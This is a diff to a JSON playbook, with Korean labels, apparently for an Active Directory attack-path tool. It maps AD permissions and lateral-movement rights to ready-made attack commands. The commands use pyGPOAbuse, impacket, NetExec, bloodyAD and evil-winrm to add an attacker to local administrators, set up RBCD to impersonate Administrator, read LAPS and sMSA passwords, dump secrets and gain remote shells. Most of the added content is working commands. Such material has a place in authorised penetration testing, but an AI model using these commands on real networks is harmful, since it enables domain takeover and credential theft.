@@ -359,6 +359,113 @@
         {"name": "pyGPOAbuse", "type": "py", "url": "https://github.com/Hackndo/pyGPOAbuse"},
         {"name": "SharpGPOAbuse", "type": "exe", "url": "https://github.com/FSecureLABS/SharpGPOAbuse"}
       ]
+    },
+
+    "WriteGPLink": {
+      "ko": "OU/도메인에 GPO 링크 쓰기 가능",
+      "priority": "high",
+      "summary": "공격자가 만든 악성 GPO 를 대상 OU 에 링크 -> OU 하위 모든 컴퓨터/사용자에 코드 실행.",
+      "abuse": [
+        {
+          "when": "대상이 OU/도메인",
+          "steps": ["악성 GPO 생성/획득 후 대상 OU 에 링크 -> 하위 객체 장악"],
+          "cmd": [
+            "pygpoabuse corp.local/attacker:'Passw0rd!' -gpo-id 'GPO-GUID' -command 'net localgroup administrators attacker /add'",
+            "PowerView> New-GPLink -Name 'EvilGPO' -Target 'OU=Workstations,DC=corp,DC=local'"
+          ]
+        }
+      ],
+      "tools": [
+        {"name": "pyGPOAbuse", "type": "py", "url": "https://github.com/Hackndo/pyGPOAbuse"},
+        {"name": "PowerView", "type": "ps1", "url": "https://github.com/PowerShellMafia/PowerSploit"}
+      ]
+    },
+
+    "WriteAccountRestrictions": {
+      "ko": "대상 컴퓨터의 계정 제한 속성 쓰기 (RBCD 설정 포함)",
+      "priority": "high",
+      "summary": "msDS-AllowedToActOnBehalfOfOtherIdentity 를 써서 RBCD 로 임퍼소네이션 (AddAllowedToAct 와 동일 효과).",
+      "abuse": [
+        {
+          "when": "대상이 컴퓨터",
+          "steps": ["컴퓨터계정 생성 -> RBCD 설정 -> getST 임퍼소네이션"],
+          "cmd": [
+            "impacket-addcomputer -computer-name 'ATTACKERPC$' -computer-pass 'MachinePass1!' 'corp.local/attacker:Passw0rd!'",
+            "impacket-rbcd -delegate-from 'ATTACKERPC$' -delegate-to 'TARGET$' -action write 'corp.local/attacker:Passw0rd!'",
+            "impacket-getST -spn 'cifs/target.corp.local' -impersonate Administrator 'corp.local/ATTACKERPC$:MachinePass1!'"
+          ]
+        }
+      ],
+      "tools": [{"name": "impacket addcomputer/rbcd/getST", "type": "py", "url": "https://github.com/fortra/impacket"}]
+    },
+
+    "SyncLAPSPassword": {
+      "ko": "LAPS 비번 동기화(DirSync) 읽기 권한",
+      "priority": "high",
+      "summary": "DirSync 로 대상 컴퓨터 LAPS 로컬 관리자 비번 읽기 (ReadLAPSPassword 와 유사).",
+      "abuse": [
+        {
+          "when": "대상이 컴퓨터",
+          "steps": ["LAPS 비번 조회 -> 로컬 관리자 로그인"],
+          "cmd": [
+            "nxc ldap dc01 -u attacker -p 'Passw0rd!' -M laps",
+            "bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 get object 'TARGET$' --attr ms-Mcs-AdmPwd"
+          ]
+        }
+      ],
+      "tools": [{"name": "NetExec / bloodyAD", "type": "py", "url": "https://github.com/Pennyw0rth/NetExec"}]
+    },
+
+    "DumpSMSAPassword": {
+      "ko": "sMSA(단독 관리 서비스 계정) 비번 읽기",
+      "priority": "high",
+      "summary": "msDS-ManagedPassword 읽어 sMSA NT 해시 획득 (ReadGMSAPassword 계열).",
+      "abuse": [
+        {
+          "when": "대상이 sMSA 계정",
+          "steps": ["관리 비번 덤프 -> NT 해시로 PtH"],
+          "cmd": ["bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 get object 'SMSA$' --attr msDS-ManagedPassword"]
+        }
+      ],
+      "tools": [{"name": "bloodyAD", "type": "py", "url": "https://github.com/CravateRouge/bloodyAD"}]
+    }
+  },
+
+  "lateral": {
+    "_note": "bloodhound-python 이 수집한 컴퓨터 로컬그룹(LocalAdmins/RDP/WinRM/DCOM) 기반 측면이동. --owned 계정이 접근 가능한 호스트를 우선 표시.",
+    "LocalAdmin": {
+      "ko": "로컬 관리자 -> 해당 호스트 즉시 장악(SYSTEM)",
+      "priority": "high",
+      "cmd": [
+        "nxc smb TARGET_HOST -u attacker -p 'Passw0rd!' -x 'whoami'",
+        "impacket-psexec 'corp.local/attacker:Passw0rd!'@TARGET_HOST",
+        "impacket-secretsdump 'corp.local/attacker:Passw0rd!'@TARGET_HOST"
+      ],
+      "tools": [
+        {"name": "NetExec", "type": "py", "url": "https://github.com/Pennyw0rth/NetExec"},
+        {"name": "impacket psexec/secretsdump", "type": "py", "url": "https://github.com/fortra/impacket"}
+      ]
+    },
+    "RDP": {
+      "ko": "원격 데스크톱 접근 가능",
+      "priority": "med",
+      "cmd": ["xfreerdp /u:attacker /p:'Passw0rd!' /d:corp.local /v:TARGET_HOST /cert:ignore"],
+      "tools": [{"name": "xfreerdp", "type": "cli", "url": "https://www.freerdp.com/"}]
+    },
+    "WinRM": {
+      "ko": "WinRM(PowerShell Remoting) 접근 가능",
+      "priority": "high",
+      "cmd": [
+        "evil-winrm -i TARGET_HOST -u attacker -p 'Passw0rd!'",
+        "nxc winrm TARGET_HOST -u attacker -p 'Passw0rd!'"
+      ],
+      "tools": [{"name": "evil-winrm", "type": "cli", "url": "https://github.com/Hackplayers/evil-winrm"}]
+    },
+    "DCOM": {
+      "ko": "DCOM 원격 실행 가능",
+      "priority": "med",
+      "cmd": ["impacket-dcomexec 'corp.local/attacker:Passw0rd!'@TARGET_HOST 'whoami'"],
+      "tools": [{"name": "impacket dcomexec", "type": "py", "url": "https://github.com/fortra/impacket"}]
     }
   },
 
